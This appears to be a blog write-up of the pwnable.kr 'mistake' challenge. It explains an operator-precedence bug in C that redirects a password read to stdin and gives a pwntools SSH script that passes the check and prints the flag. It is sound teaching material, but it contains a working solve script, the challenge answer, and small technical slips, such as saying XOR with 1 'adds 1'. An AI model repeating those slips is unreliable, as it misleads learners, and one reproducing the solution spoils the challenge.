---
layout: post
title: Binary Exploitation&#58; Pwnable.kr/mistake
---

## Pwnable.kr: mistake - Write-up

We have access to two files, an executable named ```mistake``` and a c file named ```mistake.c```. When we try to run the executable, we are prompted with an error and the program exits.
```
└─$ ./mistake 
can't open password 1
```

For the sake of learning, let's take a look at the file type.
```
└─$ file mistake 
mistake: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ef56e67046843c3d794fda2e5842140e937dd7c6, not stripped
```

Looks like a standard linux executable, dynamically linked, and not stripped.

Time to inspect the c file.
```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```

There is a good amount to unpack here, but right off the bat I notice an operation priority conflict.
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
```

In C programming, relational operators such as ```<``` and ```>``` take priority over assignment operators like ```=```. This means that the relational expression will be evaluated first followed by the assignment expression.

We know that ```open``` returns a non-negative value on success and ```-1``` on error. We know that the file ```password``` exists on the ```ssh``` server, so we can assume that the integer returned from ```open``` will be greater than or equal to ```0```. This would mean that the relational expression would evaluate to false and therefore the value ```0``` would be assigned to the file descriptor ```fd```. The ```fd``` file descriptor is an alias for ```stdin```.

Next, ```read``` reads in 10 bytes from ```stdin``` into a character array named ```pw_buf``` and ensures that the function read at least one byte.
```c
	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;               
	}
```

We are then prompted for a password and ten bytes from stdin are read into another character array named ```pw_buf2```.
```c
	char pw_buf2[PW_LEN+1];
	printf("input password : ");
        scanf("%10s", pw_buf2);
```

Now we get to the encryption function.
```c
	// xor your input
        xor(pw_buf2, 10);### xor()
```

### xor()

This function takes two parameters, a character array and an integer. The values being passed to the ```xor``` function are ```pw_buf2``` and the number of bytes read into ```pw_buf```. Then, a ```for``` loop is used to iterate over each character of ```pw_buf``` and encrypt it with the ```xor``` of ```1```.
```c
void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}
```

Once ```xor``` returns, the value of ```pw_buf``` and the new value of ```pw_buf2``` are compared. If they match, we get the flag.

### pwn

So we need a string for ```pw_buf2``` that when ```xor```ed with ```1``` equals ```pw_buf```. When you ```xor``` a value with 1, you add ```1``` to it. So if we make ```pw_buf``` the string ```"AAAAAAAAAA"```, we should be able to use ```"@@@@@@@@@@"``` and pass the check. Let's write a python script.
```python
#!/usr/bin/python


from pwn import *

conn = ssh(user="mistake", host="pwnable.kr", port=2222, password="guest")
proc = conn.process(executable="./mistake", argv=None, env=None)
proc.sendline("AAAAAAAAAA")
proc.sendline("@@@@@@@@@@")


proc.interactive()
```

All we are doing is connecting to the ```ssh``` server, executing the process, and sending the two lines of text we need. Let's see if we are successful.
```
└─$ python exploit.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] mistake@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process bytearray(b'./mistake') on pwnable.kr: pid 217238
/home/jake/Desktop/pwnable_kr/mistake/exploit.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.sendline("AAAAAAAAAA")
/home/jake/Desktop/pwnable_kr/mistake/exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.sendline("@@@@@@@@@@")
[*] Switching to interactive mode
do not bruteforce...
input password : Password OK
Mommy, the operator priority always confuses me :(
[*] Got EOF while reading in interactive
```

Et Voila!
